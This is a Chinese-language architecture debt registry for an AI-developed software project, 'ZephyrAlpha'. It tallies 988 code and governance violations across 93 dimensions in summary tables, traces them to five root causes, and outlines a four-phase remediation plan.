# 架构债务注册表（Architecture Debt Registry）

> **文档性质**：全项目架构债务单一真源（Single Source of Truth）
> **审核日期**：2026-06-30
> **审核员**：客观专业架构师（基于4轮深度调研的真实文件证据）
> **审核方法**：4个并行子agent读真实文件 + Grep真实结果 + AST共享行百分比判定
> **问题总数**：**988个唯一违规点**（298初轮 + 52第5轮 + 42第6轮 + 76第7轮 + 60第8轮 + 49第9轮 + 45第10轮 + 98第11轮 + 42第12轮 + 26第13轮 + 54第14轮 + 65第15轮 + 33第16轮 + 16第17轮 + 32第18轮新增，去重后），归因于5个病根
> **治本方案**：4期施工（仪表盘→AST门禁→批量修复→治理层收敛）
> **维护规则**：本文档由架构健康度仪表盘（第0期交付物）自动派生，禁止手工编辑违规清单部分

---

## 目录

- [一、执行摘要](#一执行摘要)
- [二、问题总数确定](#二问题总数确定)
- [三、病根分析（5个根因）](#三病根分析5个根因)
- [四、战略层裁定（针对100%AI开发）](#四战略层裁定针对100ai开发)
- [五、988个问题详细清单](#五988个问题详细清单)
  - [5.1 SSoT真源唯一性违规（211个）](#51-ssot真源唯一性违规211个)
  - [5.2 永久系统全自动触发违规（32个）](#52-永久系统全自动触发违规32个)
  - [5.3 新AI可发现性违规（55个）](#53-新ai可发现性违规55个)
  - [5.4 DB全景图深度违规（17个，第5轮新增）](#54-db全景图深度违规17个第5轮新增)
  - [5.5 文档引用断裂违规（26个，第5轮新增）](#55-文档引用断裂违规26个第5轮新增)
  - [5.6 三方对齐与规则一致性违规（9个，第5轮新增）](#56-三方对齐与规则一致性违规9个第5轮新增)
  - [5.7 CI死工作流与幻影模块（4个，第6轮新增）](#57-ci死工作流与幻影模块4个第6轮新增)
  - [5.8 测试与静态分析免疫系统（3个，第6轮新增）](#58-测试与静态分析免疫系统3个第6轮新增)
  - [5.9 元数据数字漂移与计数不一致（7个，第6轮新增）](#59-元数据数字漂移与计数不一致7个第6轮新增)
  - [5.10 注册表消费链与引用断裂（22个，第6轮新增）](#510-注册表消费链与引用断裂22个第6轮新增)
  - [5.11 门禁与规则格式漂移（6个，第6轮新增）](#511-门禁与规则格式漂移6个第6轮新增)
  - [5.12 代码语义与异常处理反模式（30个，第7轮新增）](#512-代码语义与异常处理反模式30个第7轮新增)
  - [5.13 文档内容数字准确性（20个，第7轮新增）](#513-文档内容数字准确性20个第7轮新增)
  - [5.14 配置部署运行时一致性（26个，第7轮新增）](#514-配置部署运行时一致性26个第7轮新增)
  - [5.15 韧性恢复与错误处理深度（15个，第8轮新增）](#515-韧性恢复与错误处理深度15个第8轮新增)
  - [5.16 并发与线程安全违规（15个，第8轮新增）](#516-并发与线程安全违规15个第8轮新增)
  - [5.17 安全纵深防御与访问控制（15个，第8轮新增）](#517-安全纵深防御与访问控制15个第8轮新增)
  - [5.18 数据完整性与Schema演进（15个，第8轮新增）](#518-数据完整性与schema演进15个第8轮新增)
  - [5.19 API契约与接口一致性（12个，第9轮新增）](#519-api契约与接口一致性12个第9轮新增)
  - [5.20 可观测性与日志一致性（12个，第9轮新增）](#520-可观测性与日志一致性12个第9轮新增)
  - [5.21 测试质量与隔离深度（13个，第9轮新增）](#521-测试质量与隔离深度13个第9轮新增)
  - [5.22 依赖图与导入完整性（12个，第9轮新增）](#522-依赖图与导入完整性12个第9轮新增)
  - [5.23 配置管理一致性（9个，第10轮新增）](#523-配置管理一致性9个第10轮新增)
  - [5.24 性能反模式（6个，第10轮新增）](#524-性能反模式6个第10轮新增)
  - [5.25 代码复杂度与可维护性（5个，第10轮新增）](#525-代码复杂度与可维护性5个第10轮新增)
  - [5.26 生命周期与资源管理（10个，第10轮新增）](#526-生命周期与资源管理10个第10轮新增)
  - [5.27 文档与代码同步（7个，第10轮新增）](#527-文档与代码同步7个第10轮新增)
  - [5.28 错误消息质量（8个，第10轮新增）](#528-错误消息质量8个第10轮新增)
  - [5.29 Git版本控制实践（6个，第11轮新增）](#529-git版本控制实践6个第11轮新增)
  - [5.30 依赖管理（6个，第11轮新增）](#530-依赖管理6个第11轮新增)
  - [5.31 构建打包（17个，第11轮新增）](#531-构建打包17个第11轮新增)
  - [5.32 数据迁移策略（10个，第11轮新增）](#532-数据迁移策略10个第11轮新增)
  - [5.33 容灾与备份（10个，第11轮新增）](#533-容灾与备份10个第11轮新增)
  - [5.34 环境隔离（10个，第11轮新增）](#534-环境隔离10个第11轮新增)
  - [5.35 API版本管理（8个，第11轮新增）](#535-api版本管理8个第11轮新增)
  - [5.36 限流与配额（10个，第11轮新增）](#536-限流与配额10个第11轮新增)
  - [5.37 审计日志完整性（13个，第11轮新增）](#537-审计日志完整性13个第11轮新增)
  - [5.38 特性开关（9个，第11轮新增）](#538-特性开关9个第11轮新增)
  - [5.39 可观测性深度（9个，第12轮新增）](#539-可观测性深度9个第12轮新增)
  - [5.40 幂等性与重试语义（9个，第12轮新增）](#540-幂等性与重试语义9个第12轮新增)
  - [5.41 状态机正确性（10个，第12轮新增）](#541-状态机正确性10个第12轮新增)
  - [5.42 代码注释与API文档（4个，第12轮新增）](#542-代码注释与api文档4个第12轮新增)
  - [5.43 资源配额管理（5个，第12轮新增）](#543-资源配额管理5个第12轮新增)
  - [5.44 批处理正确性（5个，第12轮新增）](#544-批处理正确性5个第12轮新增)
  - [5.45 输入验证与净化深度（5个，第13轮新增）](#545-输入验证与净化深度5个第13轮新增)
  - [5.46 时间与时区处理（3个，第13轮新增）](#546-时间与时区处理3个第13轮新增)
  - [5.47 缓存一致性（3个，第13轮新增）](#547-缓存一致性3个第13轮新增)
  - [5.48 序列化安全（3个，第13轮新增）](#548-序列化安全3个第13轮新增)
  - [5.49 文件描述符与句柄泄漏（5个，第13轮新增）](#549-文件描述符与句柄泄漏5个第13轮新增)
  - [5.50 数值精度与类型安全（2个，第13轮新增）](#550-数值精度与类型安全2个第13轮新增)
  - [5.51 集合变异安全（1个，第13轮新增）](#551-集合变异安全1个第13轮新增)
  - [5.52 异步/同步边界（4个，第13轮新增）](#552-异步同步边界4个第13轮新增)
  - [5.53 日志级别纪律（7个，第14轮新增）](#553-日志级别纪律7个第14轮新增)
  - [5.54 配置热重载（5个，第14轮新增）](#554-配置热重载5个第14轮新增)
  - [5.55 健康检查深度（6个，第14轮新增）](#555-健康检查深度6个第14轮新增)
  - [5.56 协议合规性（5个，第14轮新增）](#556-协议合规性5个第14轮新增)
  - [5.57 事件排序与因果一致性（7个，第14轮新增）](#557-事件排序与因果一致性7个第14轮新增)
  - [5.58 分布式锁正确性（10个，第14轮新增）](#558-分布式锁正确性10个第14轮新增)
  - [5.59 编码与字符集（5个，第14轮新增）](#559-编码与字符集5个第14轮新增)
  - [5.60 模块耦合度深度（9个，第14轮新增）](#560-模块耦合度深度9个第14轮新增)
  - [5.61 事务隔离与ACID合规性（7个，第15轮新增）](#561-事务隔离与acid合规性7个第15轮新增)
  - [5.62 密钥轮换与密钥管理（7个，第15轮新增）](#562-密钥轮换与密钥管理7个第15轮新增)
  - [5.63 日志中PII/敏感数据泄露（3个，第15轮新增）](#563-日志中pii敏感数据泄露3个第15轮新增)
  - [5.64 连接池管理（5个，第15轮新增）](#564-连接池管理5个第15轮新增)
  - [5.65 内存管理与泄漏模式（11个，第15轮新增）](#565-内存管理与泄漏模式11个第15轮新增)
  - [5.66 模板注入与字符串格式化安全（6个，第15轮新增）](#566-模板注入与字符串格式化安全6个第15轮新增)
  - [5.67 线程/进程池大小与背压（3个，第15轮新增）](#567-线程进程池大小与背压3个第15轮新增)
  - [5.68 异步取消与超时语义（4个，第15轮新增）](#568-异步取消与超时语义4个第15轮新增)
  - [5.69 部分失败处理（5个，第15轮新增）](#569-部分失败处理5个第15轮新增)
  - [5.70 优雅降级与回退模式（4个，第15轮新增）](#570-优雅降级与回退模式4个第15轮新增)
  - [5.71 启动验证与Fail-Fast（4个，第15轮新增）](#571-启动验证与fail-fast4个第15轮新增)
  - [5.72 重试风暴预防（6个，第15轮新增）](#572-重试风暴预防6个第15轮新增)
  - [5.73 上下文管理器正确性（4个，第16轮新增）](#573-上下文管理器正确性4个第16轮新增)
  - [5.74 文件系统原子性（4个，第16轮新增）](#574-文件系统原子性4个第16轮新增)
  - [5.75 子进程返回码检查（4个，第16轮新增）](#575-子进程返回码检查4个第16轮新增)
  - [5.76 异常层级与捕获广度（4个，第16轮新增）](#576-异常层级与捕获广度4个第16轮新增)
  - [5.77 信号处理与进程生命周期（5个，第16轮新增）](#577-信号处理与进程生命周期5个第16轮新增)
  - [5.78 装饰器正确性（3个，第16轮新增）](#578-装饰器正确性3个第16轮新增)
  - [5.79 导入副作用（4个，第16轮新增）](#579-导入副作用4个第16轮新增)
  - [5.80 线程局部与ContextVar清理（5个，第16轮新增）](#580-线程局部与contextvar清理5个第16轮新增)
  - [5.81 全局状态与单例模式（4个，第17轮新增）](#581-全局状态与单例模式4个第17轮新增)
  - [5.82 迭代器与生成器正确性（1个，第17轮新增）](#582-迭代器与生成器正确性1个第17轮新增)
  - [5.83 Hash/Equality契约（1个，第17轮新增）](#583-hashequality契约1个第17轮新增)
  - [5.84 错误路径资源清理（2个，第17轮新增）](#584-错误路径资源清理2个第17轮新增)
  - [5.85 浅拷贝与可变返回值（4个，第17轮新增）](#585-浅拷贝与可变返回值4个第17轮新增)
  - [5.86 字符串与路径边界情况（4个，第17轮新增）](#586-字符串与路径边界情况4个第17轮新增)
  - [5.87 错误链与traceback保全（3个，第18轮新增）](#587-错误链与traceback保全3个第18轮新增)
  - [5.88 生产代码assert误用（6个，第18轮新增）](#588-生产代码assert误用6个第18轮新增)
  - [5.89 类级可变状态（8个，第18轮新增）](#589-类级可变状态8个第18轮新增)
  - [5.90 魔术方法一致性（1个，第18轮新增）](#590-魔术方法一致性1个第18轮新增)
  - [5.91 Property副作用（4个，第18轮新增）](#591-property副作用4个第18轮新增)
  - [5.92 Enum正确性（2个，第18轮新增）](#592-enum正确性2个第18轮新增)
  - [5.93 __init__.py污染（8个，第18轮新增）](#593-initpy污染8个第18轮新增)
- [六、治本施工方案（4期）](#六治本施工方案4期)
- [七、客观立场声明](#七客观立场声明)

---

## 一、执行摘要

ZephyrAlpha项目是100%AI开发（trae IDE + AI对话触发），AI上下文有限。项目治理体系设计严谨（trae_060三原则 + 17个reconciler + 52个gate + 34个词表 + CapabilityLookup反查机制），但**执行覆盖存在系统性断层**。

经18轮深度调研（每个子agent读真实文件+Grep真实结果+AST共享行百分比判定），**去重后唯一违规点总数 = 988个**（298初轮 + 52第5轮 + 42第6轮 + 76第7轮 + 60第8轮 + 49第9轮 + 45第10轮 + 98第11轮 + 42第12轮 + 26第13轮 + 54第14轮 + 65第15轮 + 33第16轮 + 16第17轮 + 32第18轮新增），分布在93个维度：

| 维度 | 违规数 | 高危 | 中危 | 低危 | 核心问题 |
|---|:---:|:---:|:---:|:---:|---|
| SSoT真源唯一性 | 211 | 177 | 34 | 0 | 159对文件复制 + 41处词表硬编码 |
| 永久系统触发 | 32 | 22 | 10 | 0 | 15处时间触发 + 6处空handler |
| 新AI可发现性 | 55 | 11 | 44 | 0 | 40个GATE无反查 + 10个关键能力未注册 |
| DB全景图深度（第5轮） | 17 | 1 | 16 | 0 | 949真孤儿未监控 + 2表脱管 + 死代码 |
| 文档引用断裂（第5轮） | 26 | 9 | 3 | 14 | 136处引用断裂 + 自指断链 |
| 三方对齐与规则（第5轮） | 9 | 6 | 3 | 0 | 宪法级声明与代码不符 |
| CI死工作流与幻影模块（第6轮） | 4 | 4 | 0 | 0 | 2死CI + 1幻影生成器 + 1幻影模块 |
| 测试与静态分析免疫系统（第6轮） | 3 | 2 | 1 | 0 | 113处import-skip + F821全局忽略 + 夹具断链 |
| 元数据数字漂移（第6轮） | 7 | 2 | 3 | 2 | gate数52/49/51 + 词表34/35 + MCP10/11 |
| 注册表消费链断裂（第6轮） | 22 | 9 | 9 | 4 | 30卡片错配 + __init__ 9幻影 + 3catalog漏登记 |
| 门禁与规则格式漂移（第6轮） | 6 | 2 | 3 | 1 | CommitGateRegistry 4/12/51 + depends_on 6格式 |
| 代码语义与异常反模式（第7轮） | 30 | 10 | 13 | 7 | 205处except:pass + 签名漂移 + 并发泄漏 |
| 文档内容数字准确性（第7轮） | 20 | 10 | 10 | 0 | 43域过时 + 87行低估 + DB清单遗漏PG |
| 配置部署运行时一致性（第7轮） | 26 | 9 | 12 | 5 | Dockerfile引用幻影模块 + MCP ACL失效 |
| 韧性恢复与错误处理（第8轮） | 15 | 4 | 10 | 1 | 事务持锁+DB/git分裂+dlq死代码+UPDATE无UPSERT |
| 并发与线程安全（第8轮） | 15 | 9 | 6 | 0 | 4处无锁单例+3处锁外写共享+TOCTOU僵尸锁+async/sync混用 |
| 安全纵深防御（第8轮） | 15 | 6 | 7 | 2 | 审计writer no-op+HMAC硬编码+eval配置+RBAC默认关 |
| 数据完整性与Schema演进（第8轮） | 15 | 8 | 6 | 1 | PRAGMA事务无效+FK类型不匹配+3表schema分裂+无rollback |
| API契约与接口一致性（第9轮） | 12 | 5 | 7 | 0 | Pydantic v1/v2混用+__all__=["*"]失效+verify_chain 6种返回类型 |
| 可观测性与日志一致性（第9轮） | 12 | 4 | 8 | 0 | 3套日志+100处裸getLogger+642处print+metric API漂移 |
| 测试质量与隔离深度（第9轮） | 13 | 5 | 8 | 0 | assert True占位+生产库写入+119处skip+mock空转 |
| 依赖图与导入完整性（第9轮） | 12 | 7 | 5 | 0 | 9幻影子包+循环依赖+shared违反importlinter+13处ImportError吞 |
| 配置管理一致性（第10轮） | 9 | 4 | 4 | 1 | 真API密钥硬编码+YAML无schema校验+load_yaml_config_validated死代码+.env不匹配 |
| 性能反模式（第10轮） | 6 | 3 | 3 | 0 | 0处@lru_cache+O(n²)相关性引擎+N+1 INSERT+N+1 DFS+MemoryCache O(n) LRU+无界告警列表 |
| 代码复杂度与可维护性（第10轮） | 5 | 2 | 3 | 0 | 1086行contract_registry+114行orchestrate+god class AutoRuntimeCore(36方法) |
| 生命周期与资源管理（第10轮） | 10 | 5 | 5 | 0 | boot()无失败检查+shutdown非逆序+health_check硬编码True+TeardownManager假清理+SIGTERM未处理 |
| 文档与代码同步（第10轮） | 7 | 4 | 3 | 0 | README路径错+stub标production+重复deepseek_v4_chat+3个session_lifecycle.py |
| 错误消息质量（第10轮） | 8 | 2 | 4 | 2 | SQL泄漏到错误消息+无actionable信息+MCP错误码双轨+死代码return后 |
| Git版本控制实践（第11轮） | 6 | 2 | 3 | 1 | main无保护+.gitignore漏忽略+无CODEOWNERS+LFS格式不全 |
| 依赖管理（第11轮） | 6 | 4 | 2 | 0 | 全>=无锁定+无锁文件+requirements与pyproject分叉+dev依赖入生产镜像 |
| 构建打包（第11轮） | 17 | 4 | 10 | 3 | Docker CMD指向幻影模块+无.dockerignore+版本号三重真源+非多阶段构建 |
| 数据迁移策略（第11轮） | 10 | 3 | 6 | 1 | 硬编码Win路径+TRUNCATE后失败全损+零测试+18条SQLite迁移成孤儿 |
| 容灾与备份（第11轮） | 10 | 7 | 3 | 0 | PG无pg_dump+备份工具过时+无RTO/RPO+单机SPOF+.runtime无备份 |
| 环境隔离（第11轮） | 10 | 8 | 2 | 0 | ZEPHYR_ENV值与枚举不匹配+无compose override+测试用SQLite生产用PG+is_prod()零调用 |
| API版本管理（第11轮） | 8 | 1 | 5 | 2 | MCP工具无version+api_version_contract死代码+无breaking change检测+无deprecation |
| 限流与配额（第11轮） | 10 | 2 | 6 | 2 | 5套限流器碎片化+无per-user配额+TokenBucket竞态+配置不加载+无配额耗尽告警 |
| 审计日志完整性（第11轮） | 13 | 6 | 7 | 0 | write_to_core no-op+verify()永返True+Merkle聚合stub+缺actor/action/target+裸git commit |
| 特性开关（第11轮） | 9 | 3 | 5 | 1 | 4套系统碎片化+global_flag_registry零调用+flags.yaml死配置+默认ON违反安全默认 |
| 可观测性深度（第12轮） | 9 | 4 | 4 | 1 | health_monitor丢弃指标+counter()幻影方法+trace断链+SLOManager死代码+无OTLP |
| 幂等性与重试语义（第12轮） | 9 | 5 | 4 | 0 | 重试无Idempotency-Key+DLQ为stub+_call_webhook为pass+IdempotencyStore内存且未接入 |
| 状态机正确性（第12轮） | 10 | 6 | 4 | 0 | 无转换校验+无锁+force_state绕过终态+DriftStateMachine假实现+RollbackSM无审计 |
| 代码注释与API文档（第12轮） | 4 | 1 | 2 | 1 | 核心函数缺docstring+deprecated标但仍调用+baseline_manager方法错误嵌套（结构bug） |
| 资源配额管理（第12轮） | 5 | 1 | 3 | 1 | Docker无CPU/内存限制+无RLIMIT+无连接池+gather无Semaphore+磁盘未纳入压力分类 |
| 批处理正确性（第12轮） | 5 | 2 | 3 | 0 | evaluate_batch无限制+return_exceptions=False丢成功+逐行execute+无max_batch_size |
| 输入验证与净化深度（第13轮） | 5 | 2 | 2 | 1 | shell=True命令注入+exec()执行LLM代码+eval()类型注解+路径穿越子串匹配+API清洗器不足 |
| 时间与时区处理（第13轮） | 3 | 1 | 1 | 1 | time.time()用于TTL+naive/aware datetime混用100+处+datetime.now与fromtimestamp混用 |
| 缓存一致性（第13轮） | 3 | 1 | 2 | 0 | CacheInvalidationManager无自动失效+SemanticCache无锁重建击穿+版本无迁移 |
| 序列化安全（第13轮） | 3 | 1 | 2 | 0 | yaml.load(FullLoader)+json.loads无schema校验+SerializationContract版本不校验 |
| 文件描述符与句柄泄漏（第13轮） | 5 | 1 | 4 | 0 | Popen孤儿进程+sqlite未try/finally（8+文件）+长生命周期连接无close |
| 数值精度与类型安全（第13轮） | 2 | 0 | 0 | 2 | 浮点==比较+conversation_tax除以极小值产生inf（金额已全面用Decimal，值得肯定） |
| 集合变异安全（第13轮） | 1 | 1 | 0 | 0 | MCP create_task可变默认参数=[]导致任务范围跨调用污染 |
| 异步/同步边界（第13轮） | 4 | 2 | 2 | 0 | asyncio.run在async上下文静默绕过安全扫描+run_coroutine_threadsafe死锁+42+处散布 |
| 日志级别纪律（第14轮） | 7 | 2 | 5 | 0 | INFO记录FAILED事件+健康监控异常完全静默+log-and-continue反模式 |
| 配置热重载（第14轮） | 5 | 0 | 5 | 0 | Provider配置导入时冻结+EnvWatcher不更新os.environ+reload不通知旧引用+回调失败静默 |
| 健康检查深度（第14轮） | 6 | 4 | 2 | 0 | readiness探针不检查依赖+健康探针永远alive=True+VerdictEngine硬编码healthy+BlueprintHealthChecker空壳 |
| 协议合规性（第14轮） | 5 | 0 | 4 | 1 | HTTP只接受200+JSON-RPC id=null违反规范+错误码语义不匹配+队列满静默丢弃 |
| 事件排序与因果一致性（第14轮） | 7 | 3 | 4 | 0 | 事件ID秒级碰撞+异常静默吞没+DLQ attach空操作+完整性校验空操作+outbox fetch_pending无锁竞态 |
| 分布式锁正确性（第14轮） | 10 | 7 | 3 | 0 | 锁释放不验证持有者+无fencing token+无自动续期+os.replace覆盖他人锁+TOCTOU竞态+空lock_id释放 |
| 编码与字符集（第14轮） | 5 | 2 | 2 | 1 | CSV未处理UTF-8 BOM+多编码回退链(utf-8→gbk→latin-1)误判+errors=ignore丢字节+errors=replace产生幻觉路径 |
| 模块耦合度深度（第14轮） | 9 | 4 | 4 | 1 | governance↔trading循环依赖+shared(L1)→trading(L2)跨层+infrastructure(L0)→governance(L2)+compliance包为re-export壳 |
| 事务隔离与ACID合规性（第15轮） | 7 | 2 | 4 | 1 | batch_review非原子+PG autocommit=True+retry_count事务外更新+连接池无锁竞态+get_db_connection命名冲突 |
| 密钥轮换与密钥管理（第15轮） | 7 | 4 | 2 | 1 | HMAC密钥"default-key"硬编码+IntegrityVerifier全部9处调用未传hmac_key+CredentialRotationTrigger仅检测不轮换+LLM网关绕过SecretProvider |
| 日志中PII/敏感数据泄露（第15轮） | 3 | 0 | 2 | 1 | DLQ存储error_traceback可能含凭据+PG连接失败异常可能泄露密码+EmergencyOverride记录token_id |
| 连接池管理（第15轮） | 5 | 2 | 2 | 1 | PG无连接池每次新建TCP+单一PG连接跨线程共享+SQLite池无pool_recycle+池耗尽无限创建临时连接+泄漏检测器失效 |
| 内存管理与泄漏模式（第15轮） | 11 | 2 | 5 | 4 | ResourceAwarePool Future无界增长+WorkOrchestrator _items不删除+MemoryLock _locks不回收+TimeoutGuard _handlers泄漏+DriftStateMachine _events无界 |
| 模板注入与字符串格式化安全（第15轮） | 6 | 1 | 5 | 0 | DatabaseService f-string拼接INSERT列名(SQL注入)+sqlite_dumper表名拼接+registry_adapter表名拼接+rollback_verifier表名拼接 |
| 线程/进程池大小与背压（第15轮） | 3 | 3 | 0 | 0 | ResourceAwarePool无背压+GPUConsensusScheduler max_workers未用+AsyncRuntime.run_in_executor .result()死锁 |
| 异步取消与超时语义（第15轮） | 4 | 2 | 2 | 0 | drift_engine超时后子进程未kill(2处副本)+verdict_engine.evaluate_batch无并发限制+MemoryLock超时取消后锁状态不一致 |
| 部分失败处理（第15轮） | 5 | 1 | 4 | 0 | gate异常视为通过(fail-open)+dispatch handler静默吞异常+load_dags静默跳过失败+boot步骤失败后继续执行+告警发送异常静默 |
| 优雅降级与回退模式（第15轮） | 4 | 0 | 2 | 2 | ResourceOptimizationEngine启动失败静默+EscalationProtocol仅debug日志+SpecEngine解析失败静默+多处return False/None无日志 |
| 启动验证与Fail-Fast（第15轮） | 4 | 1 | 2 | 1 | boot()缺关键配置验证+validate_all仅验证import不验证运行时+integration_validate失败不阻断+coldstart不检查ready |
| 重试风暴预防（第15轮） | 6 | 2 | 2 | 2 | DeepSeekChat无backoff无jitter+OllamaChat无try/except+DeepSeekV4Chat固定延迟+自愈循环无退避+DeadlockDetector无jitter+pipeline无jitter |
| 上下文管理器正确性（第16轮） | 4 | 0 | 4 | 0 | __exit__丢弃返回值破坏异常抑制+flush()掩盖原始异常+os.close未防护致僵尸锁+WAL checkpoint未异常隔离 |
| 文件系统原子性（第16轮） | 4 | 2 | 2 | 0 | zombie_scanner非原子写入+reconciler非原子写入YAML+results_writer非原子JSONL+tmp+replace遗漏fsync |
| 子进程返回码检查（第16轮） | 4 | 1 | 3 | 0 | tamper_proof_audit谎报committed_to_git+trigger_router cleanup不检查+ide_health_daemon不检查git返回码+cleanup_stash不检查 |
| 异常层级与捕获广度（第16轮） | 4 | 1 | 2 | 1 | PipelineError三重定义不同基类+verdict_engine except Exception伪装bug为RED+vector_memory_server掩盖编程bug+DispatchError死异常类 |
| 信号处理与进程生命周期（第16轮） | 5 | 1 | 3 | 1 | import zephyr启动daemon Timer线程+stop_polling不join+stop_zombie_scanner不join+guard_loop atexit累积+InterruptGuard非主线程无兜底 |
| 装饰器正确性（第16轮） | 3 | 0 | 1 | 2 | async_limited缺@wraps+princpled_check mutate原函数+must/should mutate原函数 |
| 导入副作用（第16轮） | 4 | 2 | 1 | 1 | 模块级os.makedirs(injection_engine)+模块级makedirs(game_day_scheduler)+find_repo_root模块级I/O+dos_launcher模块级.resolve() |
| 线程局部与ContextVar清理（第16轮） | 5 | 3 | 2 | 0 | set_request_id丢弃Token+get_logger不保存token+grant_allowance用set非reset+SQLiteMetadataStore仅关当前线程连接+_tls令牌线程池泄漏 |
| 全局状态与单例模式（第17轮） | 4 | 1 | 3 | 0 | telemetry ring buffer无锁并发修改+3处Singleton无双重检查锁 |
| 迭代器与生成器正确性（第17轮） | 1 | 0 | 1 | 0 | 生成器跨yield持有文件句柄 |
| Hash/Equality契约（第17轮） | 1 | 0 | 1 | 0 | TriggerResult定义__eq__未定义__hash__变unhashable |
| 错误路径资源清理（第17轮） | 2 | 0 | 1 | 1 | ordered_lock_acquisition list.index重复锁bug+get_market_read_conn无try/finally |
| 浅拷贝与可变返回值（第17轮） | 4 | 2 | 2 | 0 | cache_layer读写非对称+skill_context_isolation返回内部引用+doc_guard_server返回carryover引用+work_orchestrator返回内部引用 |
| 字符串与路径边界情况（第17轮） | 4 | 1 | 2 | 1 | capability_passport漏\净化+runbook_generator漏\null+staging_area未净化+Windows MAX_PATH未处理 |
| 错误链与traceback保全（第18轮） | 3 | 0 | 3 | 0 | 3处raise无from exc丢失异常链（money.py 2副本+task_repo） |
| 生产代码assert误用（第18轮） | 6 | 5 | 1 | 0 | 36处assert用于校验（atomic_tm 7+task_repo 8+transition 1+hallucination_detector 4副本16+intent_parser 2副本4+circuit_breaker 1） |
| 类级可变状态（第18轮） | 8 | 0 | 3 | 5 | daemon_registry 3处ClassVar可变+5处标准注册表模式（LOW） |
| 魔术方法一致性（第18轮） | 1 | 1 | 0 | 0 | factor_base.py @classmethod __len__失效（TriggerResult __eq__无__hash__交叉参考5.83.1） |
| Property副作用（第18轮） | 4 | 0 | 4 | 0 | 4处@property getter修改状态（admission_controller 2+resource_optimization 1+circuit_breaker 1） |
| Enum正确性（第18轮） | 2 | 0 | 0 | 2 | 30+处Enum用==而非is+7个plain Enum缺__str__ |
| __init__.py污染（第18轮） | 8 | 5 | 3 | 0 | zephyr/__init__副作用+10幻影子包+shared/__init__ 170名无import+trading/__init__ 41名无import+13处__all__=["*"] |
| **合计** | **988** | **502** | **415** | **71** | |

所有988个问题归因于**5个病根**：
1. trae_060的"违规清单"是静态快照，未随项目演进动态更新
2. 词表→代码的强制消费链存在机械盲区，GATE-VOCAB是"部分强制"
3. CapabilityLookup是"建议性反查"而非"强制性消费"
4. 永久功能与一次性脚本未区分，manual例外开口过大
5. 规则文档自身膨胀，AI上下文有限导致"规则丰富但执行断层"

**核心矛盾**：项目当前规则:执行 ≈ 10:1。100% AI开发场景下，"建议性规则"是反模式——AI没有"自觉"，只有"被阻断"。治本方向是把建议性规则转化为强制消费链（AST门禁）。

---

## 二、问题总数确定

### 2.1 六维度交叉验证

| 维度 | 违规类型 | 数量 | 严重度分布 | 数据来源 |
|---|---|:---:|---|---|
| **SSoT真源唯一性** | 词表硬编码 | 41 | 15高+26中 | Grep扫描+词表YAML交叉比对 |
| | 文件复制对 | 159 | 159高 | AST共享行百分比≥60%判定 |
| | 同步副本 | 3 | 3高 | 文件对比 |
| | 重复簇 | 6 | 6中 | 同名函数多定义 |
| | DB连接真源冲突 | 2 | 2中 | 同名函数跨包 |
| **小计** | | **211** | 177高+34中 | |
| **永久系统触发** | 永久脚本仅manual | 1 | 1高 | `[STARTUP]`标记扫描 |
| | 残留时间触发 | 15 | 15高 | while+sleep模式扫描 |
| | 事件handler空实现 | 6 | 6高 | handler实体读取 |
| | poll-loop反模式 | 26 | 26中 | while+wait模式扫描 |
| **小计** | | **32**（去重后） | 22高+10中 | |
| **新AI可发现性** | 未注册关键能力 | 10 | 10高 | capability_registry交叉比对 |
| | GATE无capability反查 | 40 | 40中 | 51个gate-11个已反查 |
| | 路径双源/矛盾 | 1 | 1中 | AGENTS.md §6 vs §11 |
| | module_id重复 | 2 | 2中 | blueprint_registry扫描 |
| | 文件残留 | 1 | 1高 | depgraph根目录残留 |
| | 路径命名不一致 | 1聚合 | 1中 | 11文件57行连字符 |
| **小计** | | **55** | 11高+44中 | |
| **DB全景图深度**（第5轮） | 真孤儿未监控 | 1聚合 | 1高 | 949真孤儿 vs 346过滤后 |
| | 表脱管schema健康检查 | 2 | 2中 | _DDL_MAP仅21表/DB实有25表 |
| | 路径列死代码 | 1 | 1中 | depgraph_schema.py:840注释遗留 |
| | 代码硬编码词表 | 1 | 1中 | diagnose_depgraph.py:427 |
| | 孤儿豁免过宽 | 1 | 1中 | ORPHAN_EXEMPT_TYPES滤603真孤儿 |
| | autopilot空handler | 1 | 1中 | _on_task_completed仅log |
| | 17处其他 | 17 | 0高+10中+7低 | 详见5.4 |
| **小计** | | **17** | 1高+16中 | |
| **文档引用断裂**（第5轮） | code-construction-standards断链 | 1聚合(57文件136处) | 1高 | Grep扫描 |
| | 连字符路径338处 | 1聚合(57文件) | 1高 | 9×原5.3.6规模 |
| | AGENTS.md引用不存在文件 | 1 | 1高 | .trae/rules/onboarding_detail.md断链 |
| | 债务登记册自指断链 | 4 | 4中 | 引用已移到_archive的文件 |
| | 17处其他文档断链 | 17 | 6高+1中+10低 | 详见5.5 |
| **小计** | | **26** | 9高+3中+14低 | |
| **三方对齐与规则**（第5轮） | check_blueprint_code_alignment.py三方矛盾 | 1 | 1高 | L1 MOD-INF-005 vs L17 MOD-INF-024 vs 蓝图不存在 |
| | 3个无效module_id | 3 | 3高 | 不在blueprint_registry |
| | make_ttl_reconciler宪法级不符 | 1 | 1高 | AGENTS.md声明已删但代码存在 |
| | 2处其他规则不符 | 2 | 1高+1中 | 详见5.6 |
| | rule_catalog 20条空stability | 1聚合 | 0高+1中 | stability字段空值 |
| **小计** | | **9** | 6高+3中 | |
| **总计** | | **392** | **226高+110中+14低（初轮+5轮） + 42（第6轮：19高+19中+4低）** | |

### 2.2 关键数据校正（与第一轮报告对比）

| 项 | 第一轮估计 | 实测值 | 偏差 |
|---|---|---|---|
| 文件复制对 | 6对 | **159对** | 严重低估26倍 |
| 词表硬编码 | ~10处 | **41处** | 低估4倍 |
| manual触发 | 4个永久功能 | 1个真正违规+96个合理manual | 第一轮过宽 |
| GATE无反查 | 39个 | **40个** | 基本准确 |
| 问题总数 | ~50个 | **298个（初轮）→ 350个（第5轮新增52）** | 严重低估7倍 |
| 真孤儿未监控 | 346（过滤后） | **949真孤儿**（ORPHAN_EXEMPT_TYPES滤掉603个） | 第1轮报告数据被脚本过滤低估2.7倍 |
| 表脱管schema健康 | 21表全覆盖 | **25表实有，2表脱管** | 第1轮未检查 |
| 文档引用断裂 | 5.3.6 11文件57行 | **57文件338处连字符+136处断链** | 第1轮严重低估30倍 |
| 宪法级声明不符 | 未检查 | **AGENTS.md §11声明make_ttl_reconciler"已删"，代码仍存在** | 第1轮未检查 |

